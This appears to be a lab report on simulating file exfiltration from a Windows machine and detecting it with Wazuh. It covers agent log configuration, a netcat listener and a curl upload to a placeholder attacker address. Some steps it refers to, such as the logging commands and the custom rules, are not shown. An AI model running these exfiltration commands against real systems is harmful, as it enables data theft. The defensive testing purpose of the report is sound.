# Cybersecurity Simulation and Vulnerability Report: Data Exfiltration

## Overview

This report presents a comprehensive simulation of a data exfiltration attack, leveraging Wazuh for detection and analysis. The simulation outlines the necessary setup on both the victim and attacker machines, the execution of the attack, and the expected alerts in a Security Information and Event Management (SIEM) system.

## Objectives

- To demonstrate the exfiltration of sensitive data using various methods.
- To illustrate the effectiveness of Wazuh in detecting abnormal activities associated with data exfiltration.

## Methodology

### Set Up

#### Victim Machine Configuration

To effectively monitor for potential data exfiltration via PowerShell, we configured the victim machine to collect relevant logs:

1. **PowerShell Logging**: 
   - Launch PowerShell with administrative privileges.
   - Execute the following commands to enable both PowerShell and script block logging.

2. **Wazuh Configuration**: 
   - Update the configuration file located at `C:\Program Files (x86)\ossec-agent\ossec.conf` to direct PowerShell logs to the Wazuh server. Insert the configuration within the `<ossec_config>` block:

   ```xml
   <localfile>
     <location>Microsoft-Windows-PowerShell/Operational</location>
     <log_format>eventchannel</log_format>
   </localfile>
   ```

3. **Restart the Endpoint**: 
   - Apply the configuration changes by restarting the machine.

   ```powershell
   Restart-Computer
   ```

#### Wazuh Server Configuration

On the Wazuh server, we implement custom rules to monitor for data exfiltration attempts:

1. Add rules tailored to detect suspicious behaviors associated with data extraction.
2. Restart the Wazuh server to apply the new detection rules.

### Attack Simulation

This simulation involves a multi-step process to execute the attack, making use of common tools:

1. **Setting Up the Attack Machine**:
   - Initiate a netcat listener on the attacker machine to receive the exfiltrated data:

   ```bash
   nc -lvp 1234 >> File.txt
   ```

2. **Data Exfiltration**:
   - From the victim machine, utilize `curl` to transfer the desired file to the attack machine (replace `path to file` with the actual file path, and `attacker ip:port` with the attacker's IP address and the listening port):

   ```powershell
   curl -T "path to file" "attacker_ip:1234"
   ```

3. **Transfer Confirmation**:
   - Confirm that the file has been successfully transferred to the attack machine.

### Detection and Alerts

Once the data exfiltration attempt is executed, Wazuh should trigger alerts based on the predefined custom rules. The SIEM will log the exfiltration attempt, providing the security team with immediate visibility into the suspicious activity.

## Conclusion

This report concludes the simulation of a data exfiltration attack utilizing Wazuh for detection. By effectively configuring both the victim and attacker environments, we illustrated how data can be exfiltrated and the crucial role of monitoring tools in identifying and responding to such threats. 

It is recommended to routinely review and update detection rules within Wazuh and continuously train security personnel to respond swiftly to potential data exfiltration incidents. 
